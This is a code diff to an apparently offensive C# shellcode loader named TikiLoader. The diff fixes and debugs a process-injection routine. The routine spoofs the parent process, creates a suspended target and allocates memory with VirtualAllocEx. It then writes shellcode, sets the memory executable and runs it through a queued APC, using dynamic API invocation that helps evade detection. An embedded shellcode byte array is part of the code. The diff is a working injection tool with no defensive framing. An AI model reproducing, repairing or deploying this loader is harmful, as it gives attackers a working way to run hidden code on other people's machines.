@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-
+using System.Text;
 using static TikiLoader.Enums;
 using static TikiLoader.Structs;
 
@@ -12,7 +12,7 @@ namespace TikiLoader
         public struct DELEGATES
         {
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr VirutalAllocEx(
+            public delegate IntPtr VirtualAllocEx(
              IntPtr hProcess,
              IntPtr lpAddress,
              uint dwSize, 
@@ -56,8 +56,9 @@ namespace TikiLoader
                 IntPtr hThread);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            [return: MarshalAs(UnmanagedType.Bool)]
             public delegate bool InitializeProcThreadAttributeList(
-               out IntPtr lpAttributeList, uint dwAttributeCount, uint dwFlags, ref IntPtr lpSize);
+               IntPtr lpAttributeList, uint dwAttributeCount, uint dwFlags, ref IntPtr lpSize);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool UpdateProcThreadAttribute(
@@ -70,7 +71,7 @@ namespace TikiLoader
                 IntPtr lpReturnSize);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate bool CreateProcess(
+            public delegate bool CreateProcessW(
                 string lpApplicationName,
                 string lpCommandLine,
                 ref SECURITY_ATTRIBUTES lpProcessAttributes,
@@ -83,17 +84,9 @@ namespace TikiLoader
                 out PROCESS_INFORMATION lpProcessInformation);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate bool DeleteProcThreadAttributeList(
+            //[return: MarshalAs(UnmanagedType.Bool)]
+            public delegate void DeleteProcThreadAttributeList(
                 IntPtr lpAttributeList);
-
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr VirtualAllocEx(
-                IntPtr hProcess, 
-                IntPtr lpAddress,
-                uint dwSize, 
-                AllocationType flAllocationType,
-                MemoryProtection flProtect
-            );
         }
 
         public static byte[] NotepadSc = new byte[344]
@@ -122,18 +115,7 @@ namespace TikiLoader
             0x0A, 0x41, 0x0F, 0xB6, 0xC0, 0x2B, 0xC1, 0xC3
         };
 
-        private static IntPtr AllocateVirutalMemory(IntPtr hProcess, uint length)
-        {
-            object[] funcargs =
-            {
-                hProcess,
-                IntPtr.Zero,
-                length,
-                AllocationType.Commit | AllocationType.Reserve, 
-                MemoryProtection.ReadWrite
-            };
-            return (IntPtr)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"VirtualAllocEx", typeof(DELEGATES.VirutalAllocEx), ref funcargs);
-        }
+        
 
         private static bool WriteShellcode(IntPtr hProcess, IntPtr baseAddr, byte[] shellcode)
         {
@@ -161,7 +143,7 @@ namespace TikiLoader
                 MemoryProtection.ExecuteRead, 
                 oldProtect
             };
-            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"VirtualAllocEx", typeof(DELEGATES.VirutalAllocEx), ref funcargs);
+            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"VirtualProtectEx", typeof(DELEGATES.VirtualProtectEx), ref funcargs);
         }
 
         private static IntPtr ResumeTargetProcess(IntPtr hProcess, IntPtr baseAddr)
@@ -199,6 +181,7 @@ namespace TikiLoader
             return (uint)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"ResumeThread", typeof(DELEGATES.ResumeThread), ref funcargs);
         }
 
+        /*
         private static bool InitializeProcThreadAttributeList(IntPtr hProcess, uint dwAttributeCount, uint dwFlags, ref IntPtr lpsize)
         {
             Console.WriteLine("Inside intiailize proc thread");
@@ -213,7 +196,12 @@ namespace TikiLoader
             return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"InitializeProcThreadAttributeList", typeof(DELEGATES.InitializeProcThreadAttributeList), ref funcargs);
         }
 
-        private static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)
+    */
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+
+        /*private static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)
         {
             object[] funcargs =
             {
@@ -228,9 +216,12 @@ namespace TikiLoader
             };
 
             return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", "UpdateProcThreadAttribute", typeof(DELEGATES.UpdateProcThreadAttribute), ref funcargs);
-        }
+        }*/
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
 
-        private static bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
+
+        private static bool CreateProcessW(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
         {
             lpProcessInformation = default;
             object[] funcargs =
@@ -246,19 +237,30 @@ namespace TikiLoader
                 lpStartupInfo,
                 lpProcessInformation
             };
+            Console.WriteLine("returning from CreateProcessW");
+            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", "CreateProcessW", typeof(DELEGATES.CreateProcessW), ref funcargs);
 
-            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", "CreateProcess", typeof(DELEGATES.CreateProcess), ref funcargs);
         }
 
-        private static bool DeleteProcThreadAttributeList(IntPtr lpAttributeList)
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+
+        /*
+        //[return: MarshalAs(UnmanagedType.Bool)]
+        private static void DeleteProcThreadAttributeList(IntPtr lpAttributeList)
         {
+            //Console.WriteLine("inside deleterpcothreadattribute");
+            //Console.ReadLine();
             object[] funcargs =
             {
                 lpAttributeList
             };
-
-            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"DeleteProcThreadAttributeList", typeof(DELEGATES.DeleteProcThreadAttributeList), ref funcargs);
+            
+            DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"DeleteProcThreadAttributeList", typeof(DELEGATES.DeleteProcThreadAttributeList), ref funcargs);
+            //Console.WriteLine($"Inside DeleteProcThreadAttribute value is {x} ");
+            //return x;
         }
+        */
 
         private static IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect)
         {
@@ -277,6 +279,19 @@ namespace TikiLoader
         {
             return VirtualAllocEx(hProcess, IntPtr.Zero, length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
         }
+        /*
+        private static IntPtr AllocateVirutalMemory(IntPtr hProcess, uint length)
+        {
+            object[] funcargs =
+            {
+                hProcess,
+                IntPtr.Zero,
+                length,
+                AllocationType.Commit | AllocationType.Reserve,
+                MemoryProtection.ReadWrite
+            };
+            return (IntPtr)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"VirtualAllocEx", typeof(DELEGATES.VirutalAllocEx), ref funcargs);
+        }*/
 
         private const int ProcThreadAttributeParentProcess = 0x00020000;
 
@@ -288,6 +303,7 @@ namespace TikiLoader
             sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
             IntPtr lpValue = IntPtr.Zero;
 
+            Console.WriteLine("inside start process");
             try
             {
                 SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
@@ -309,26 +325,76 @@ namespace TikiLoader
 
                 UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
 
-                CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
-
+                bool create = CreateProcessW(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
+                Console.WriteLine($"inside try finished creatingprocess: {create} ");
                 return pInfo;
 
             }
+            catch(Exception ex)
+            {
+                Console.WriteLine($"inside exception inside dynamicinjector {ex}");
+                Debug.WriteLine(GetAllFootprints(ex));
+                Console.WriteLine("inside catch returning pInfo");
+                return pInfo;
+            }
             finally
             {
+                Console.WriteLine("inside finally");
                 DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                 Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                 Marshal.FreeHGlobal(lpValue);
             }
+
         }
+
+        public static string GetAllFootprints(Exception x)
+        {
+            var st = new StackTrace(x, true);
+            var frames = st.GetFrames();
+            var traceString = new StringBuilder();
+
+            foreach (var frame in frames)
+            {
+                if (frame.GetFileLineNumber() < 1)
+                    continue;
+
+                traceString.Append("File: " + frame.GetFileName());
+                traceString.Append(", Method:" + frame.GetMethod().Name);
+                traceString.Append(", LineNumber: " + frame.GetFileLineNumber());
+                traceString.Append("  -->  ");
+            }
+
+            return traceString.ToString();
+
+        }
+
         public static void QUAPCInject(string binary, byte[] shellcode, int ppid)
         {
-            var pinf = StartProcess(binary, ppid);
-            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
-            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
-            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
-            QueueAPC(baseAddr, pinf.hThread);
-            ResumeTargetThread(pinf.hThread);
+            try
+            {
+                var pinf = StartProcess(binary, ppid);
+                Console.WriteLine("finished starting process");
+                var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
+                Console.WriteLine("finished allocating memory");
+                WriteShellcode(pinf.hProcess, baseAddr, shellcode);
+                Console.WriteLine("finished writing shellcode");
+                Console.WriteLine($"trying to cast: {(IntPtr)shellcode.Length} ");
+                //Environment.Exit(-2);
+
+                ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
+
+
+                Console.WriteLine("finished changing virtual memory");
+                QueueAPC(baseAddr, pinf.hThread);
+                Console.WriteLine("finished queuing apc");
+                ResumeTargetThread(pinf.hThread);
+                Console.WriteLine("finished resuming target thread");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"an exception occurred changevirtualemoryr {ex}");
+                Debug.WriteLine(GetAllFootprints(ex));
+            }
         }
     }
 }
